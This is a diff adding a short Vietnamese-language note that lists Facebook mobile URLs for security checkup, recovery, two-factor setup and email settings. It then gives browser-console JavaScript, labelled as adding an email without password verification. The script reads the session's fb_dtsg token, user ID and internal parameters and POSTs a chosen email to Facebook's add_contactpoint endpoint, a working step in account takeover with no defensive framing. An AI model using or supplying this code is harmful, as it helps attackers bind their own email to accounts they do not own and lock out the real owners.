@@ -1,0 +1,32 @@
+Link thêm mail rồi back lại www :
+https://mbasic.facebook.com/settings/account/?settings_tracking=mbasic_footer_link%3Asettings_3_0_pecs&eav=AfbfMcDWzb0-dLPsk0Pg4PAzzOKYtWSacEgpO6FW6hKxpORrtl5Kd_fPicI_7UfCQljY&paipv=0&_rdr
+
+https://m.facebook.com/nt/screen/?params=%7B%22module%22%3A%22login_alerts%22%2C%22initial_screen_id%22%3A%22[%5C%22security_checkup_start_screen%5C%22%2Cnull]%22%2C%22walkthrough_modules%22%3A[%22login_alerts%22%2C%22password_change%22%2C%22two_factor%22]%2C%22source%22%3A%22settings%22%2C%22entry_point%22%3A%22topic_selection%22%7D&path=security-checkup%2Fmodules%2F&state
+
+https://m.facebook.com/recover/initiate/?ars=security_checkup
+
+https://m.facebook.com/security/2fac/setup/intro/metadata/?source=8
+
+https://m.facebook.com/settings/email/
+
+https://m.facebook.com/phoneacquire/?source=m_account&entry_point=notif_setting_page
+
+Code add mail không xác thực pass
+
+var spinR = require(["SiteData"]).__spin_r;
+var spinB = require(["SiteData"]).__spin_b;
+var spinT = require(["SiteData"]).__spin_t;
+var jazoest = require(["SprinkleConfig"]).jazoest;
+var fbdtsg = require(["DTSGInitData"]).token;
+var userId = require(["CurrentUserInitialData"]).USER_ID;
+var hsi = require(["SiteData"]).hsi;
+var email = "mail_dd";
+var url = "https://www.facebook.com/add_contactpoint/dialog/submit/";
+var data = "jazoest=22134&fb_dtsg=" + fbdtsg + "&next=&contactpoint=" + email + "&__user=" + userId + "&__a=1&__dyn=&__req=1&__be=1&__pc=PHASED%3ADEFAULT&dpr=1&__rev=&__s=&__hsi=" + hsi + "&__spin_r=" + spinR + "&__spin_b=" + spinB + "&__spin_t=" + spinT;
+fetch(url, {
+	method: 'POST',
+	body: data,
+	headers: {
+		'Content-Type': 'application/x-www-form-urlencoded'
+	}
+}).then(e => e.text()).then(e => {})
